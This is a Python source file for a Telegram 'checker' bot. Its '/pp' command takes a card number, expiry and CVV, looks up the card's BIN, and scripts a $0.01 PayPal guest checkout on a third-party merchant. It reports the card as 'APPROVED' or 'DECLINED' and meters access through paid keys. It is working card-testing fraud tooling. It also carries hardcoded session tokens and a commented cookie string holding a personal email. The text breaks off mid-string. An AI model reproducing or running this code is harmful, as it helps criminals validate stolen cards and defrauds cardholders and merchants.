import time
import asyncio
import aiohttp
import random
from mongoDB import *
from pyrogram import Client, filters
import random
import re
import os
import requests
import random
from io import BytesIO
from pyrogram.types import (
    Message,
    InlineKeyboardButton,
    InlineKeyboardMarkup
)
import re
from values import *
from aiogram import types
import asyncio
from bs4 import BeautifulSoup as bs
import random
import string
import json
from aiohttp_proxy import ProxyConnector
import aiohttp
import os
from datetime import datetime
from gates.functions.func_imp import get_time_taken
from gates.functions.func_imp import auto_ext
from gates.functions.func_imp import find_between
from pyrogram import Client, filters
from gates.functions.func_bin import get_bin_info
from gates.functions.func_imp import get_time_taken
from gates.functions.func_esdeath import auto_sho_async

async def response_sh(textoo):
	if 'INVALID_SECURITY_CODE' in textoo or 'Authorized' in textoo:
		return 'APPROVED ✅'
	
	else:
		return 'DECLINED ❌'

@Client.on_message(filters.command('pp',prefixes=['.','!','/',',','-','$','%','#']))
async def pp_(_,message):

    tiempo = time.time()
    

    if message.reply_to_message:
      input = re.findall(r'[0-9]+',str(message.reply_to_message.text))
    else:
      input = re.findall(r'[0-9]+',str(message.text))

    encontrar_usuario = collection.find_one({"_id": message.from_user.id})
    encontrar_comando = collection_cuatro.find_one({"comando": "pp"})

    #
    if encontrar_usuario is None: return await message.reply(text='You are not currently registered in my database. /register</b>',quote=True)

    estado_comando = encontrar_comando.get("estado")
    if estado_comando == "❌":
        return await message.reply(text="""
⧽<a href="https://t.me/ShibaTX">ඩා</a>⧽ Gateway: <code>Paypal guest $0.01 </code>
⧽<a href="https://t.me/ShibaTX">ඩා</a>⧽ Estados: <code>❌</code>
⧽<a href="https://t.me/ShibaTX">ඩා</a>⧽ Format: <code>/pp cc|month|year|cvv.</code></b>""")

    encontrar_grupo = collection_tres.find_one({"group": str(message.chat.id)})

    if encontrar_usuario['key'] != 'None' or encontrar_grupo != None:
        if encontrar_usuario['key'] != 'None':
            if encontrar_usuario["key"] < datetime.now():            
                collection.update_one({"_id": message.from_user.id},{"$set": {"key": 'None'}})
                collection.update_one({"_id": message.from_user.id},{"$set": {"antispam": 60}})
                collection.update_one({"_id": message.from_user.id},{"$set": {"plan": 'Free'}})
                return await message.reply(text='your key has expired.</b>',quote=True)
        elif encontrar_grupo["key"] < datetime.now():
            collection_tres.delete_one({"group": str(message.chat.id)})

    else: return await message.reply(text='Contact an administrator to get a key.</b>',quote=True)

    
    alaa = f'''
⧽<a href="https://t.me/ShibaTX">ඩා</a>⧽ Gateway: <code>Paypal Guest $0.01 </code></b>
⧽<a href="https://t.me/ShibaTX">ඩා</a>⧽ Estados: <code>✅</code>
⧽<a href="https://t.me/ShibaTX">ඩා</a>⧽ Format: <code>/pp cc|month|year|cvv.</code>
'''
    if len(input) < 4: return await message.reply(text=alaa,quote=True)      

    tiempo_usuario = int(encontrar_usuario["time_user"])
    spam_time = int(time.time()) - tiempo_usuario
    if spam_time < encontrar_usuario['antispam']:
        tiempo_restante = encontrar_usuario['antispam'] - spam_time
        texto_spam = f"""
[ANTI_SPAM_DETECTED] Try again after <code>{tiempo_restante}</code>'s</b> 
    """
        return await Client.send_message(_,chat_id=message.chat.id,text=texto_spam,reply_to_message_id=message.id)

    collection.update_one({"_id": message.from_user.id},{"$set": {"time_user": int(time.time())}})
    ccs = True
    if not ccs:
            await message.reply("Invalid Card")
            return
    data = message.text.split(" ", 2)

    if len(data) < 2:
                await message.reply_text("Invalid Card")
                return
    
    ccs  = data[1]
    card = ccs.split("|")
    cc   = card[0]
    mes  = card[1]
    users = message.from_user.username
    ano = card[2]
    cvv = card[3]
    bin_code = cc[:6]
    x = get_bin_info (cc[0:6])


    session = requests.Session()


    headers = {
    'authority': 'www.paypal.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
    'accept-language': 'es-419,es;q=0.9',
    'referer': 'https://www.powr.io/',
    'sec-ch-ua': '"Brave";v="117", "Not;A=Brand";v="8", "Chromium";v="117"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'iframe',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'cross-site',
    'sec-fetch-user': '?1',
    'sec-gpc': '1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
}

    params = {
    'sdkVersion': '5.0.397',
    'style.layout': 'vertical',
    'style.color': 'gold',
    'style.shape': 'rect',
    'style.tagline': 'false',
    'style.menuPlacement': 'below',
    'components.0': 'buttons',
    'locale.lang': 'en',
    'locale.country': 'US',
    'sdkMeta': 'eyJ1cmwiOiJodHRwczovL3d3dy5wYXlwYWwuY29tL3Nkay9qcz9jbGllbnQtaWQ9QWJaN0RaUmFKSTZ6YWo0cTZzR3FNb2UtMS1nYXdLbXFDZ25GY0swMHY4U3lOaGVrOF9rcTYyM29CZ01QQlNCODBDR3RDLTB5RlpkcUNaWGkmbWVyY2hhbnQtaWQ9M1g1OEhORjdMRjdSVSZjdXJyZW5jeT1VU0QmY29tcG9uZW50cz1idXR0b25zIiwiYXR0cnMiOnsiZGF0YS1wYXJ0bmVyLWF0dHJpYnV0aW9uLWlkIjoiUG93cl9TUF9QQ1AiLCJkYXRhLXVpZCI6InVpZF9wb212cnBqenh1b3NrZ3NpeXp6Ynhpc2FtcWlmdnEifX0',
    'clientID': 'AbZ7DZRaJI6zaj4q6sGqMoe-1-gawKmqCgnFcK00v8SyNhek8_kq623oBgMPBSB80CGtC-0yFZdqCZXi',
    'sdkCorrelationID': 'f24876025b3bc',
    'storageID': 'uid_5d9581fdd5_mty6mtc6nte',
    'sessionID': 'uid_59a9ad8efc_mty6mtc6nte',
    'buttonSessionID': 'uid_1dc04b4400_mty6mze6mdc',
    'env': 'production',
    'buttonSize': 'large',
    'fundingEligibility': 'eyJwYXlwYWwiOnsiZWxpZ2libGUiOnRydWUsInZhdWx0YWJsZSI6dHJ1ZX0sInBheWxhdGVyIjp7ImVsaWdpYmxlIjpmYWxzZSwicHJvZHVjdHMiOnsicGF5SW4zIjp7ImVsaWdpYmxlIjpmYWxzZSwidmFyaWFudCI6bnVsbH0sInBheUluNCI6eyJlbGlnaWJsZSI6ZmFsc2UsInZhcmlhbnQiOm51bGx9LCJwYXlsYXRlciI6eyJlbGlnaWJsZSI6ZmFsc2UsInZhcmlhbnQiOm51bGx9fX0sImNhcmQiOnsiZWxpZ2libGUiOnRydWUsImJyYW5kZWQiOnRydWUsImluc3RhbGxtZW50cyI6ZmFsc2UsInZlbmRvcnMiOnsidmlzYSI6eyJlbGlnaWJsZSI6dHJ1ZSwidmF1bHRhYmxlIjp0cnVlfSwibWFzdGVyY2FyZCI6eyJlbGlnaWJsZSI6dHJ1ZSwidmF1bHRhYmxlIjp0cnVlfSwiYW1leCI6eyJlbGlnaWJsZSI6dHJ1ZSwidmF1bHRhYmxlIjp0cnVlfSwiZGlzY292ZXIiOnsiZWxpZ2libGUiOmZhbHNlLCJ2YXVsdGFibGUiOnRydWV9LCJoaXBlciI6eyJlbGlnaWJsZSI6ZmFsc2UsInZhdWx0YWJsZSI6ZmFsc2V9LCJlbG8iOnsiZWxpZ2libGUiOmZhbHNlLCJ2YXVsdGFibGUiOnRydWV9LCJqY2IiOnsiZWxpZ2libGUiOmZhbHNlLCJ2YXVsdGFibGUiOnRydWV9fSwiZ3Vlc3RFbmFibGVkIjp0cnVlfSwidmVubW8iOnsiZWxpZ2libGUiOmZhbHNlfSwiaXRhdSI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJjcmVkaXQiOnsiZWxpZ2libGUiOmZhbHNlfSwiYXBwbGVwYXkiOnsiZWxpZ2libGUiOmZhbHNlfSwic2VwYSI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJpZGVhbCI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJiYW5jb250YWN0Ijp7ImVsaWdpYmxlIjpmYWxzZX0sImdpcm9wYXkiOnsiZWxpZ2libGUiOmZhbHNlfSwiZXBzIjp7ImVsaWdpYmxlIjpmYWxzZX0sInNvZm9ydCI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJteWJhbmsiOnsiZWxpZ2libGUiOmZhbHNlfSwicDI0Ijp7ImVsaWdpYmxlIjpmYWxzZX0sIndlY2hhdHBheSI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJwYXl1Ijp7ImVsaWdpYmxlIjpmYWxzZX0sImJsaWsiOnsiZWxpZ2libGUiOmZhbHNlfSwidHJ1c3RseSI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJveHhvIjp7ImVsaWdpYmxlIjpmYWxzZX0sImJvbGV0byI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJib2xldG9iYW5jYXJpbyI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJtZXJjYWRvcGFnbyI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJtdWx0aWJhbmNvIjp7ImVsaWdpYmxlIjpmYWxzZX0sInNhdGlzcGF5Ijp7ImVsaWdpYmxlIjpmYWxzZX0sInBhaWR5Ijp7ImVsaWdpYmxlIjpmYWxzZX19',
    'platform': 'desktop',
    'experiment.enableVenmo': 'false',
    'flow': 'purchase',
    'currency': 'USD',
    'intent': 'capture',
    'commit': 'true',
    'vault': 'false',
    'merchantID.0': '3X58HNF7LF7RU',
    'renderedButtons.0': 'paypal',
    'renderedButtons.1': 'card',
    'debug': 'false',
    'applePaySupport': 'false',
    'supportsPopups': 'true',
    'supportedNativeBrowser': 'false',
    'allowBillingPayments': 'true',
    'disableSetCookie': 'true',
    'experimentation.experience': '107634',
    'experimentation.treatment': '137602',
}

    response = session.get('https://www.paypal.com/smart/buttons', params=params, headers=headers)



    headers = {
    'authority': 'www.powr.io',
    'accept': 'application/json',
    'accept-language': 'es-419,es;q=0.9',
    'content-type': 'application/json',
    'origin': 'https://www.powr.io',
    'referer': 'https://www.powr.io/checkout_screen?unique_label=735ca6cc_1549897132',
    'sec-ch-ua': '"Brave";v="117", "Not;A=Brand";v="8", "Chromium";v="117"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'sec-gpc': '1',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
}

    json_data = {
    'price': 0.01,
    'memo': '',
    'quantity': 1,
    'discount_code': '',
    'line_items': '{"subTotal":0.01,"discount":0,"tax":0,"shipping":0,"forStripeMinimum":0,"total":0.01}',
    'pending_transaction_id': 15229308,
    'app_id': 18464208,
    'price_changed_by_user': True,
    'product_option': '',
}

    response = session.post('https://www.powr.io/payments/paypal_smart_buttons', headers=headers, json=json_data)
    token = response.json()['TOKEN']
    
    contra = await message.reply(f"""
<b>𝙿𝚒𝚡𝚎𝚕 𝙲𝚑𝚔 𝙱𝚘𝚝

<b><a href="https://t.me/PixelReferencia">━━━━━━༺༻ ━━━━━━</a>
⧽<a href="https://t.me/ShibaTX">ඩා</a>⧽ Card: <code>{cc}|{mes}|{ano}|{cvv}</code>
⧼<a href="https://t.me/ShibaTX">ඩා</a>⧽ Type: <code>{x.get("vendor")} / {x.get("type")} / {x.get("level")}</code>

⪨<a href="https://t.me/ShibaTX">🜲</a>⪩ User: @{users} [{encontrar_usuario["plan"]}]
<a href="https://t.me/PixelReferencia">━━━━━━༺༻ ━━━━━━</a></b>""", reply_to_message_id=message.id, disable_web_page_preview=True)  
    #time.sleep(10)
    
    headers = {
    'authority': 'www.paypal.com',
    'accept': 'application/json',

    ## we xd Link expired: Link no longer exists

    #yia 20.0$ el charge verga no me da reponse 
    #XD NO TE DA NADA O COMO 

    #####   Ingrese el Link: https://www.dtlr.com ay se queda le metiste time.sleep toy usan el auto xdd
    # DD ESA PAG, NO ACEPTA PAGOS DICE xddd verga mano no consigo una payesi troste

    'accept-language': 'es-419,es;q=0.9',
    'content-type': 'application/json',
    'origin': 'https://www.paypal.com',
    'paypal-client-context': token,
    'referer': 'https://www.paypal.com/smart/buttons?sdkVersion=5.0.397&style.layout=vertical&style.color=gold&style.shape=rect&style.tagline=false&style.menuPlacement=below&components.0=buttons&locale.lang=en&locale.country=US&sdkMeta=eyJ1cmwiOiJodHRwczovL3d3dy5wYXlwYWwuY29tL3Nkay9qcz9jbGllbnQtaWQ9QWJaN0RaUmFKSTZ6YWo0cTZzR3FNb2UtMS1nYXdLbXFDZ25GY0swMHY4U3lOaGVrOF9rcTYyM29CZ01QQlNCODBDR3RDLTB5RlpkcUNaWGkmbWVyY2hhbnQtaWQ9M1g1OEhORjdMRjdSVSZjdXJyZW5jeT1VU0QmY29tcG9uZW50cz1idXR0b25zIiwiYXR0cnMiOnsiZGF0YS1wYXJ0bmVyLWF0dHJpYnV0aW9uLWlkIjoiUG93cl9TUF9QQ1AiLCJkYXRhLXVpZCI6InVpZF9wb212cnBqenh1b3NrZ3NpeXp6Ynhpc2FtcWlmdnEifX0&clientID=AbZ7DZRaJI6zaj4q6sGqMoe-1-gawKmqCgnFcK00v8SyNhek8_kq623oBgMPBSB80CGtC-0yFZdqCZXi&sdkCorrelationID=f24876025b3bc&storageID=uid_5d9581fdd5_mty6mtc6nte&sessionID=uid_59a9ad8efc_mty6mtc6nte&buttonSessionID=uid_22eb981b66_mty6mtg6mti&env=production&buttonSize=large&fundingEligibility=eyJwYXlwYWwiOnsiZWxpZ2libGUiOnRydWUsInZhdWx0YWJsZSI6dHJ1ZX0sInBheWxhdGVyIjp7ImVsaWdpYmxlIjpmYWxzZSwicHJvZHVjdHMiOnsicGF5SW4zIjp7ImVsaWdpYmxlIjpmYWxzZSwidmFyaWFudCI6bnVsbH0sInBheUluNCI6eyJlbGlnaWJsZSI6ZmFsc2UsInZhcmlhbnQiOm51bGx9LCJwYXlsYXRlciI6eyJlbGlnaWJsZSI6ZmFsc2UsInZhcmlhbnQiOm51bGx9fX0sImNhcmQiOnsiZWxpZ2libGUiOnRydWUsImJyYW5kZWQiOnRydWUsImluc3RhbGxtZW50cyI6ZmFsc2UsInZlbmRvcnMiOnsidmlzYSI6eyJlbGlnaWJsZSI6dHJ1ZSwidmF1bHRhYmxlIjp0cnVlfSwibWFzdGVyY2FyZCI6eyJlbGlnaWJsZSI6dHJ1ZSwidmF1bHRhYmxlIjp0cnVlfSwiYW1leCI6eyJlbGlnaWJsZSI6dHJ1ZSwidmF1bHRhYmxlIjp0cnVlfSwiZGlzY292ZXIiOnsiZWxpZ2libGUiOmZhbHNlLCJ2YXVsdGFibGUiOnRydWV9LCJoaXBlciI6eyJlbGlnaWJsZSI6ZmFsc2UsInZhdWx0YWJsZSI6ZmFsc2V9LCJlbG8iOnsiZWxpZ2libGUiOmZhbHNlLCJ2YXVsdGFibGUiOnRydWV9LCJqY2IiOnsiZWxpZ2libGUiOmZhbHNlLCJ2YXVsdGFibGUiOnRydWV9fSwiZ3Vlc3RFbmFibGVkIjp0cnVlfSwidmVubW8iOnsiZWxpZ2libGUiOmZhbHNlfSwiaXRhdSI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJjcmVkaXQiOnsiZWxpZ2libGUiOmZhbHNlfSwiYXBwbGVwYXkiOnsiZWxpZ2libGUiOmZhbHNlfSwic2VwYSI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJpZGVhbCI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJiYW5jb250YWN0Ijp7ImVsaWdpYmxlIjpmYWxzZX0sImdpcm9wYXkiOnsiZWxpZ2libGUiOmZhbHNlfSwiZXBzIjp7ImVsaWdpYmxlIjpmYWxzZX0sInNvZm9ydCI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJteWJhbmsiOnsiZWxpZ2libGUiOmZhbHNlfSwicDI0Ijp7ImVsaWdpYmxlIjpmYWxzZX0sIndlY2hhdHBheSI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJwYXl1Ijp7ImVsaWdpYmxlIjpmYWxzZX0sImJsaWsiOnsiZWxpZ2libGUiOmZhbHNlfSwidHJ1c3RseSI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJveHhvIjp7ImVsaWdpYmxlIjpmYWxzZX0sImJvbGV0byI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJib2xldG9iYW5jYXJpbyI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJtZXJjYWRvcGFnbyI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJtdWx0aWJhbmNvIjp7ImVsaWdpYmxlIjpmYWxzZX0sInNhdGlzcGF5Ijp7ImVsaWdpYmxlIjpmYWxzZX0sInBhaWR5Ijp7ImVsaWdpYmxlIjpmYWxzZX19&platform=desktop&experiment.enableVenmo=false&flow=purchase&currency=USD&intent=capture&commit=true&vault=false&merchantID.0=3X58HNF7LF7RU&renderedButtons.0=paypal&renderedButtons.1=card&debug=false&applePaySupport=false&supportsPopups=true&supportedNativeBrowser=false&allowBillingPayments=true&disableSetCookie=true&experimentation.experience=107634&experimentation.treatment=137602',
    'sec-ch-ua': '"Brave";v="117", "Not;A=Brand";v="8", "Chromium";v="117"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'sec-gpc': '1',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
    'x-app-name': 'smart-payment-buttons',
}

    json_data = {
    'query': '\n            mutation UpdateClientConfig(\n                $orderID : String!,\n                $fundingSource : ButtonFundingSourceType!,\n                $integrationArtifact : IntegrationArtifactType!,\n                $userExperienceFlow : UserExperienceFlowType!,\n                $productFlow : ProductFlowType!,\n                $buttonSessionID : String\n            ) {\n                updateClientConfig(\n                    token: $orderID,\n                    fundingSource: $fundingSource,\n                    integrationArtifact: $integrationArtifact,\n                    userExperienceFlow: $userExperienceFlow,\n                    productFlow: $productFlow,\n                    buttonSessionID: $buttonSessionID\n                )\n            }\n        ',
    'variables': {
        'orderID': token,
        'fundingSource': 'card',
        'integrationArtifact': 'PAYPAL_JS_SDK',
        'userExperienceFlow': 'INLINE',
        'productFlow': 'SMART_PAYMENT_BUTTONS',
    },
}

    response = session.post('https://www.paypal.com/graphql?UpdateClientConfig', headers=headers, json=json_data)


    headers = {
    'authority': 'www.paypal.com',
    'accept': 'application/json',
    'accept-language': 'es-419,es;q=0.9',
    'content-type': 'application/json',
    'origin': 'https://www.paypal.com',
    'paypal-client-context': token,
    'referer': 'https://www.paypal.com/smart/buttons?sdkVersion=5.0.397&style.layout=vertical&style.color=gold&style.shape=rect&style.tagline=false&style.menuPlacement=below&components.0=buttons&locale.lang=en&locale.country=US&sdkMeta=eyJ1cmwiOiJodHRwczovL3d3dy5wYXlwYWwuY29tL3Nkay9qcz9jbGllbnQtaWQ9QWJaN0RaUmFKSTZ6YWo0cTZzR3FNb2UtMS1nYXdLbXFDZ25GY0swMHY4U3lOaGVrOF9rcTYyM29CZ01QQlNCODBDR3RDLTB5RlpkcUNaWGkmbWVyY2hhbnQtaWQ9M1g1OEhORjdMRjdSVSZjdXJyZW5jeT1VU0QmY29tcG9uZW50cz1idXR0b25zIiwiYXR0cnMiOnsiZGF0YS1wYXJ0bmVyLWF0dHJpYnV0aW9uLWlkIjoiUG93cl9TUF9QQ1AiLCJkYXRhLXVpZCI6InVpZF9wb212cnBqenh1b3NrZ3NpeXp6Ynhpc2FtcWlmdnEifX0&clientID=AbZ7DZRaJI6zaj4q6sGqMoe-1-gawKmqCgnFcK00v8SyNhek8_kq623oBgMPBSB80CGtC-0yFZdqCZXi&sdkCorrelationID=f24876025b3bc&storageID=uid_5d9581fdd5_mty6mtc6nte&sessionID=uid_59a9ad8efc_mty6mtc6nte&buttonSessionID=uid_1dc04b4400_mty6mze6mdc&env=production&buttonSize=large&fundingEligibility=eyJwYXlwYWwiOnsiZWxpZ2libGUiOnRydWUsInZhdWx0YWJsZSI6dHJ1ZX0sInBheWxhdGVyIjp7ImVsaWdpYmxlIjpmYWxzZSwicHJvZHVjdHMiOnsicGF5SW4zIjp7ImVsaWdpYmxlIjpmYWxzZSwidmFyaWFudCI6bnVsbH0sInBheUluNCI6eyJlbGlnaWJsZSI6ZmFsc2UsInZhcmlhbnQiOm51bGx9LCJwYXlsYXRlciI6eyJlbGlnaWJsZSI6ZmFsc2UsInZhcmlhbnQiOm51bGx9fX0sImNhcmQiOnsiZWxpZ2libGUiOnRydWUsImJyYW5kZWQiOnRydWUsImluc3RhbGxtZW50cyI6ZmFsc2UsInZlbmRvcnMiOnsidmlzYSI6eyJlbGlnaWJsZSI6dHJ1ZSwidmF1bHRhYmxlIjp0cnVlfSwibWFzdGVyY2FyZCI6eyJlbGlnaWJsZSI6dHJ1ZSwidmF1bHRhYmxlIjp0cnVlfSwiYW1leCI6eyJlbGlnaWJsZSI6dHJ1ZSwidmF1bHRhYmxlIjp0cnVlfSwiZGlzY292ZXIiOnsiZWxpZ2libGUiOmZhbHNlLCJ2YXVsdGFibGUiOnRydWV9LCJoaXBlciI6eyJlbGlnaWJsZSI6ZmFsc2UsInZhdWx0YWJsZSI6ZmFsc2V9LCJlbG8iOnsiZWxpZ2libGUiOmZhbHNlLCJ2YXVsdGFibGUiOnRydWV9LCJqY2IiOnsiZWxpZ2libGUiOmZhbHNlLCJ2YXVsdGFibGUiOnRydWV9fSwiZ3Vlc3RFbmFibGVkIjp0cnVlfSwidmVubW8iOnsiZWxpZ2libGUiOmZhbHNlfSwiaXRhdSI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJjcmVkaXQiOnsiZWxpZ2libGUiOmZhbHNlfSwiYXBwbGVwYXkiOnsiZWxpZ2libGUiOmZhbHNlfSwic2VwYSI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJpZGVhbCI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJiYW5jb250YWN0Ijp7ImVsaWdpYmxlIjpmYWxzZX0sImdpcm9wYXkiOnsiZWxpZ2libGUiOmZhbHNlfSwiZXBzIjp7ImVsaWdpYmxlIjpmYWxzZX0sInNvZm9ydCI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJteWJhbmsiOnsiZWxpZ2libGUiOmZhbHNlfSwicDI0Ijp7ImVsaWdpYmxlIjpmYWxzZX0sIndlY2hhdHBheSI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJwYXl1Ijp7ImVsaWdpYmxlIjpmYWxzZX0sImJsaWsiOnsiZWxpZ2libGUiOmZhbHNlfSwidHJ1c3RseSI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJveHhvIjp7ImVsaWdpYmxlIjpmYWxzZX0sImJvbGV0byI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJib2xldG9iYW5jYXJpbyI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJtZXJjYWRvcGFnbyI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJtdWx0aWJhbmNvIjp7ImVsaWdpYmxlIjpmYWxzZX0sInNhdGlzcGF5Ijp7ImVsaWdpYmxlIjpmYWxzZX0sInBhaWR5Ijp7ImVsaWdpYmxlIjpmYWxzZX19&platform=desktop&experiment.enableVenmo=false&flow=purchase&currency=USD&intent=capture&commit=true&vault=false&merchantID.0=3X58HNF7LF7RU&renderedButtons.0=paypal&renderedButtons.1=card&debug=false&applePaySupport=false&supportsPopups=true&supportedNativeBrowser=false&allowBillingPayments=true&disableSetCookie=true&experimentation.experience=107634&experimentation.treatment=137602',
    'sec-ch-ua': '"Brave";v="117", "Not;A=Brand";v="8", "Chromium";v="117"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'sec-gpc': '1',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
    'x-app-name': 'smart-payment-buttons',
}

    json_data = {
    'query': '\n        query GetCheckoutDetails($orderID: String!) {\n            checkoutSession(token: $orderID) {\n                cart {\n                    billingType\n                    intent\n                    paymentId\n                    billingToken\n                    amounts {\n                        total {\n                            currencyValue\n                            currencyCode\n                            currencyFormatSymbolISOCurrency\n                        }\n                    }\n                    supplementary {\n                        initiationIntent\n                    }\n                    category\n                }\n                flags {\n                    isChangeShippingAddressAllowed\n                }\n                payees {\n                    merchantId\n                    email {\n                        stringValue\n                    }\n                }\n            }\n        }\n        ',
    'variables': {
        'orderID': token,
    },
}

    response = session.post('https://www.paypal.com/graphql?GetCheckoutDetails', headers=headers, json=json_data)


    headers = {
    'authority': 'www.paypal.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
    'accept-language': 'es-419,es;q=0.9',
    # 'cookie': 'enforce_policy=ccpa; LANG=es_XC%3BUS; nsid=s%3AvpYdedXlFW_a__ZRiKqad10DIEaYeXwt.CUMz5NlcuTyZF%2F1eBKx6EL6P5vS9ovTP1LVYW7YJiWg; ts_c=vr%3D99a2e06d18a0a1f1ac98fee5fb079a28%26vt%3D99a2e06d18a0a1f1ac98fee5fb079a27; KHcl0EuY7AKSMgfvHl7J5E7hPtK=4FaKly4QGsJSxuz2rvkdPS60gfrrr5BojVnN4771Zj7XgF8TIceEUh9RF-KLaxeTf7od-5rE8NescfDc; l7_az=dcg01.phx; AV894Kt2TSumQQrJwe-8mzmyREO=S23AAOpn4HSvy-C6uxuaicMYmppgAPvzPvtOTSwC1R3_K2do2mCRWbBpoD_NpL00PdxF6KGolbpeNBcsTzJQfYnr2igrH1zdQ; login_email=pepegl9304%40gmail.com; tsrce=checkoutjs; x-pp-s=eyJ0IjoiMTY5NDc5NDc2MzQ5MiIsImwiOiIwIiwibSI6IjAifQ; ts=vreXpYrS%3D1789489163%26vteXpYrS%3D1694796563%26vr%3D99a2e06d18a0a1f1ac98fee5fb079a28%26vt%3D99a2e06d18a0a1f1ac98fee5fb079a27%26vtyp%3Dnew',
    'referer': 'https://www.paypal.com/smart/buttons?sdkVersion=5.0.397&style.layout=vertical&style.color=gold&style.shape=rect&style.tagline=false&style.menuPlacement=below&components.0=buttons&locale.lang=en&locale.country=US&sdkMeta=eyJ1cmwiOiJodHRwczovL3d3dy5wYXlwYWwuY29tL3Nkay9qcz9jbGllbnQtaWQ9QWJaN0RaUmFKSTZ6YWo0cTZzR3FNb2UtMS1nYXdLbXFDZ25GY0swMHY4U3lOaGVrOF9rcTYyM29CZ01QQlNCODBDR3RDLTB5RlpkcUNaWGkmbWVyY2hhbnQtaWQ9M1g1OEhORjdMRjdSVSZjdXJyZW5jeT1VU0QmY29tcG9uZW50cz1idXR0b25zIiwiYXR0cnMiOnsiZGF0YS1wYXJ0bmVyLWF0dHJpYnV0aW9uLWlkIjoiUG93cl9TUF9QQ1AiLCJkYXRhLXVpZCI6InVpZF9wb212cnBqenh1b3NrZ3NpeXp6Ynhpc2FtcWlmdnEifX0&clientID=AbZ7DZRaJI6zaj4q6sGqMoe-1-gawKmqCgnFcK00v8SyNhek8_kq623oBgMPBSB80CGtC-0yFZdqCZXi&sdkCorrelationID=f24876025b3bc&storageID=uid_5d9581fdd5_mty6mtc6nte&sessionID=uid_59a9ad8efc_mty6mtc6nte&buttonSessionID=uid_1dc04b4400_mty6mze6mdc&env=production&buttonSize=large&fundingEligibility=eyJwYXlwYWwiOnsiZWxpZ2libGUiOnRydWUsInZhdWx0YWJsZSI6dHJ1ZX0sInBheWxhdGVyIjp7ImVsaWdpYmxlIjpmYWxzZSwicHJvZHVjdHMiOnsicGF5SW4zIjp7ImVsaWdpYmxlIjpmYWxzZSwidmFyaWFudCI6bnVsbH0sInBheUluNCI6eyJlbGlnaWJsZSI6ZmFsc2UsInZhcmlhbnQiOm51bGx9LCJwYXlsYXRlciI6eyJlbGlnaWJsZSI6ZmFsc2UsInZhcmlhbnQiOm51bGx9fX0sImNhcmQiOnsiZWxpZ2libGUiOnRydWUsImJyYW5kZWQiOnRydWUsImluc3RhbGxtZW50cyI6ZmFsc2UsInZlbmRvcnMiOnsidmlzYSI6eyJlbGlnaWJsZSI6dHJ1ZSwidmF1bHRhYmxlIjp0cnVlfSwibWFzdGVyY2FyZCI6eyJlbGlnaWJsZSI6dHJ1ZSwidmF1bHRhYmxlIjp0cnVlfSwiYW1leCI6eyJlbGlnaWJsZSI6dHJ1ZSwidmF1bHRhYmxlIjp0cnVlfSwiZGlzY292ZXIiOnsiZWxpZ2libGUiOmZhbHNlLCJ2YXVsdGFibGUiOnRydWV9LCJoaXBlciI6eyJlbGlnaWJsZSI6ZmFsc2UsInZhdWx0YWJsZSI6ZmFsc2V9LCJlbG8iOnsiZWxpZ2libGUiOmZhbHNlLCJ2YXVsdGFibGUiOnRydWV9LCJqY2IiOnsiZWxpZ2libGUiOmZhbHNlLCJ2YXVsdGFibGUiOnRydWV9fSwiZ3Vlc3RFbmFibGVkIjp0cnVlfSwidmVubW8iOnsiZWxpZ2libGUiOmZhbHNlfSwiaXRhdSI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJjcmVkaXQiOnsiZWxpZ2libGUiOmZhbHNlfSwiYXBwbGVwYXkiOnsiZWxpZ2libGUiOmZhbHNlfSwic2VwYSI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJpZGVhbCI6eyJlbGlnaWJsZSI6ZmFsc2V9LC